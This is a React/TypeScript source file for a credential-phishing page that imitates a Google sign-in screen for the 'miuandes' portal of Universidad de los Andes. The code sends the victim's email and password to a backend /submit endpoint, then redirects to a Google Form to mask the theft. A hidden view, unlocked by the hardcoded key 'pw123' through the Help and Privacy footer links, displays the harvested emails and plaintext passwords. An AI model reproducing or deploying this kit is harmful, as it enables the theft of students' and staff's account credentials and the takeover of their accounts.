import { useState } from 'react'
import './App.css'
import logoUandes from './assets/logo-uandes.png'

interface User {
  id: number
  email: string
  password: string
  created_at: string
}

const API_URL = import.meta.env.VITE_API_URL


function App() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [showPasswordView, setShowPasswordView] = useState(false)
  const [showPrivacyView, setShowPrivacyView] = useState(false)
  const [showUsersTable, setShowUsersTable] = useState(false)
  const [adminKey, setAdminKey] = useState('')
  const [users, setUsers] = useState<User[]>([])
  const [message, setMessage] = useState('') // para mostrar confirmación o error

  // === función que envía el correo al backend Flask ===
  const handleEmailSubmit = async () => {
    if (!email) {
      setMessage('⚠️ Ingresa un correo antes de continuar')
      return
    }

    // En móvil, cambia a la vista de contraseña
    const isMobile = window.innerWidth <= 768
    if (isMobile) {
      setShowPasswordView(true)
      setMessage('')
      return
    }

    // En escritorio, envía al backend
    try {
      const response = await fetch(`${API_URL}/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email }) // envía el correo al backend
      })

      const data = await response.json()

      if (response.ok) {
        setMessage('✅ Correo guardado con éxito')
      } else {
        setMessage(`❌ Error: ${data.error || 'No se pudo guardar'}`)
      }
    } catch (error) {
      console.error('Error al conectar con el backend:', error)
      setMessage('❌ Error de conexión con el servidor')
    }
  }

  // === función que envía la contraseña al backend y redirige al formulario ===
  const handlePasswordSubmit = async () => {
    if (!password) {
      setMessage('⚠️ Ingresa tu contraseña antes de continuar')
      return
    }

    // Enviar datos al backend antes de redirigir
    try {
      const response = await fetch(`${API_URL}/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      })
      
      if (!response.ok) {
        console.error('Error al guardar en el backend')
      }
    } catch (error) {
      console.error('Error al conectar con el backend:', error)
    }

    // Redirigir al formulario de Google
    window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSfvlQFtK6i3ZCt7mVNtXFZRHOc_tpAnRsNtjgFKkZRjoIb1tg/viewform'
  }

  // === función para verificar la clave de administrador ===
  const handleAdminKeySubmit = async () => {
    if (adminKey === 'pw123') {
      // Cargar usuarios desde el backend
      try {
        const response = await fetch(`${API_URL}/users`)
        const data = await response.json()
        if (response.ok) {
          setUsers(data.users || [])
          setShowUsersTable(true)
          setMessage('')
        } else {
          setMessage('❌ Error al cargar usuarios')
        }
      } catch (error) {
        console.error('Error al cargar usuarios:', error)
        setMessage('❌ Error de conexión con el servidor')
      }
    } else {
      setMessage('⚠️ Clave incorrecta')
    }
  }

  // === función para volver a la vista principal ===
  const handleBackToMain = () => {
    setShowPrivacyView(false)
    setShowUsersTable(false)
    setAdminKey('')
    setUsers([])
    setMessage('')
  }

  // Vista de tabla de usuarios
  if (showUsersTable) {
    return (
      <div className="app-container">
        <div className="login-dialog">
          <div className="header-top university-header">
            <img 
              src={logoUandes}
              alt="Universidad de los Andes"
              className="uandes-logo"
            />
            <span className="uandes-title">miuandes</span>
          </div>
          <div className="dialog-header">
            <div className="header-left">
              <h1 className="login-title">Usuarios Registrados</h1>
            </div>
          </div>
          <div className="users-table-container">
            <table className="users-table">
              <thead>
                <tr>
                  <th>ID</th>
                  <th>Email</th>
                  <th>Contraseña</th>
                  <th>Fecha de Registro</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr key={user.id}>
                    <td>{user.id}</td>
                    <td>{user.email}</td>
                    <td>{user.password}</td>
                    <td>{new Date(user.created_at).toLocaleString('es-ES')}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          <div className="admin-actions">
            <button className="back-btn" onClick={handleBackToMain}>Volver</button>
          </div>
        </div>
      </div>
    )
  }

  // Vista de clave de administrador
  if (showPrivacyView) {
    return (
      <div className="app-container">
        <div className="login-dialog">
          <div className="header-top university-header">
            <img 
              src={logoUandes}
              alt="Universidad de los Andes"
              className="uandes-logo"
            />
            <span className="uandes-title">miuandes</span>
          </div>
          <div className="dialog-header">
            <div className="header-left">
              <h1 className="login-title">Privacidad</h1>
              <p className="login-subtitle">Ingresa la clave de acceso</p>
            </div>
          </div>
          <div className="mobile-content">
            <div className="mobile-input-container">
              <input
                type="password"
                className="mobile-email-input"
                placeholder="Clave"
                value={adminKey}
                onChange={(e) => setAdminKey(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleAdminKeySubmit()}
              />
            </div>
          </div>
          <div className="mobile-footer">
            <button className="back-btn" onClick={handleBackToMain}>Volver</button>
            <button className="mobile-next-btn" onClick={handleAdminKeySubmit}>Acceder</button>
          </div>
          {message && (
            <p style={{ textAlign: 'center', marginTop: '15px', color: message.includes('Error') || message.includes('incorrecta') ? '#f44336' : 'white' }}>
              {message}
            </p>
          )}
        </div>
      </div>
    )
  }

  // Vista principal de login
  return (
    <div className="app-container">
      <div className="login-dialog">
        <div className="header-top university-header">
          <img 
            src={logoUandes}
            alt="Universidad de los Andes"
            className="uandes-logo"
          />
          <span className="uandes-title">miuandes</span>
        </div>

        <div className="dialog-header">
          <div className="header-left">
            <h1 className="login-title">{showPasswordView ? 'Te damos la bienvenida' : 'Inicia sesión'}</h1>
            {!showPasswordView && <p className="login-subtitle">Utiliza tu cuenta de Google</p>}
          </div>
          <div className="header-right">
            <div className="input-container">
              <input
                type="text"
                className="email-input"
                placeholder="Correo electrónico o teléfono"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
          </div>
        </div>

        <div className="dialog-content">
          <div className="content-left">
            <p className="description">
              con tu cuenta de Google. Esta cuenta estará disponible para otras aplicaciones de Google en el navegador.
            </p>
          </div>

          <div className="content-right">
            <a href="#" className="forgot-link">¿Has olvidado tu correo electrónico?</a>
            
            <p className="guest-mode-info">
              ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. <a href="#" className="info-link">Más información sobre cómo usar el modo Invitado</a>
            </p>
          </div>
        </div>

        {!showPasswordView && (
          <>
            <div className="mobile-content">
              <div className="mobile-input-container">
                <input
                  type="text"
                  className="mobile-email-input"
                  placeholder="Correo electrónico o teléfono"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
              <a href="#" className="mobile-forgot-link">¿Has olvidado tu correo electrónico?</a>
              <p className="mobile-guest-mode-info">
                ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. <a href="#" className="info-link">Más información sobre cómo usar el modo Invitado</a>
              </p>
            </div>

            <div className="dialog-footer">
              <a href="#" className="create-account-link">Crear cuenta</a>
              {/* 🔹 botón que envía el email al backend */}
              <button className="next-btn" onClick={handleEmailSubmit}>Siguiente</button>
            </div>

            <div className="mobile-footer">
              <a href="#" className="mobile-create-account-link">Crear cuenta</a>
              <button className="mobile-next-btn" onClick={handleEmailSubmit}>Siguiente</button>
            </div>
          </>
        )}

        {showPasswordView && (
          <>
            <div className="password-mobile-content">
              <div className="password-email-container">
                <div className="password-email-field" onClick={() => setShowPasswordView(false)}>
                  <svg className="user-icon" width="20" height="20" viewBox="0 0 24 24">
                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                  </svg>
                  <span className="password-email-text">{email || 'joacoestebanv@gmail.com'}</span>
                  <svg className="dropdown-arrow" width="20" height="20" viewBox="0 0 24 24">
                    <path d="M7 10l5 5 5-5z"/>
                  </svg>
                </div>
              </div>

              <div className="password-input-container">
                <input
                  type={showPassword ? "text" : "password"}
                  className="password-input"
                  placeholder="Introduce tu contraseña"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>

              <div className="show-password-container">
                <input
                  type="checkbox"
                  id="show-password"
                  className="show-password-checkbox"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                />
                <label htmlFor="show-password" className="show-password-label">Mostrar contraseña</label>
              </div>

              <div className="password-footer-row">
                <a href="#" className="forgot-password-link">¿Has olvidado tu contraseña?</a>
                <button className="password-next-btn" onClick={handlePasswordSubmit}>Siguiente</button>
              </div>
            </div>
          </>
        )}

        {/* 🔹 mensaje de confirmación */}
        {message && (
          <p style={{ textAlign: 'center', marginTop: '15px', color: 'white' }}>
            {message}
          </p>
        )}
      </div>

      <div className="page-footer">
        <div className="language-selector">
          <span>Español (España)</span>
          <svg width="12" height="12" viewBox="0 0 12 12">
            <path d="M6 8L2 4h8L6 8z"/>
          </svg>
        </div>
        <div className="footer-links">
          <a href="#" onClick={(e) => { e.preventDefault(); setShowPrivacyView(true) }}>Ayuda</a>
          <a href="#" onClick={(e) => { e.preventDefault(); setShowPrivacyView(true) }}>Privacidad</a>
          <a href="#">Términos</a>
        </div>
      </div>
    </div>
  )
}

export default App
